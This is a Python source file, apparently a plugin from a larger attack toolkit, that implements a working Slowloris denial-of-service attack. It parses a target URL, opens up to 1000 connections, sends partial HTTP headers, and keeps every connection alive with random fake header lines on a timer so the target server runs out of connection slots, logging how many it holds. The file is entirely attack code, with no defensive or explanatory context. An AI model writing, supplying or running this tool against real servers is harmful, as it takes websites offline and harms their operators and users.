from plugins.common import *
import socket
import threading
import time
import random

def slowloris(host, port=80, connections=1000):
    try:
        if host.startswith('https://'):
            host = host[8:]
            port = 443
        elif host.startswith('http://'):
            host = host[7:]
            port = 80

        host = host.split('/')[0]

        if ':' in host:
            host, port = host.split(':')

        host = host.strip()
        port = int(port)
        connections = int(connections)

        host = host.strip()
        port = int(port)
        connections = int(connections)
        count = [0]
        holding = [0]
        stop = threading.Event()

        logging.info(f'Starting Slowloris -> {host}:{port} | {connections} connections | Ctrl+C to stop')

        def make_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, port))
                s.send(f'GET /?{random.randint(0, 9999)} HTTP/1.1\r\n'.encode())
                s.send(f'Host: {host}\r\n'.encode())
                s.send(f'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n'.encode())
                s.send(f'Accept: text/html,application/xhtml+xml\r\n'.encode())
                s.send(f'Accept-Language: en-US,en;q=0.5\r\n'.encode())
                s.send(f'Connection: keep-alive\r\n'.encode())
                return s
            except:
                return None

        sockets = []

        logging.info('Opening initial connections...')
        for _ in range(connections):
            if stop.is_set():
                break
            s = make_socket()
            if s:
                sockets.append(s)
                count[0] += 1
                holding[0] += 1

        logging.success(f'Holding {holding[0]} connections')

        def keepalive():
            while not stop.is_set():
                dead = []
                for s in sockets:
                    try:
                        s.send(f'X-a: {random.randint(1, 9999)}\r\n'.encode())
                    except:
                        dead.append(s)

                for s in dead:
                    sockets.remove(s)
                    holding[0] -= 1

                while len(sockets) < connections and not stop.is_set():
                    s = make_socket()
                    if s:
                        sockets.append(s)
                        count[0] += 1
                        holding[0] += 1

                time.sleep(10)

        def stats():
            while not stop.is_set():
                time.sleep(1)
                logging.info(f'Total: {count[0]} | Holding: {holding[0]} | Dead: {count[0] - holding[0]}')

        t1 = threading.Thread(target=keepalive, daemon=True)
        t2 = threading.Thread(target=stats, daemon=True)
        t1.start()
        t2.start()

        while not stop.is_set():
            time.sleep(0.1)

    except KeyboardInterrupt:
        stop.set()
        for s in sockets:
            try:
                s.close()
            except:
                pass
        logging.success(f'Stopped | Total: {count[0]} | Holding: {holding[0]}')
    except socket.gaierror:
        logging.error(f'Cannot resolve hostname')
    except Exception as e:
        logging.error(e)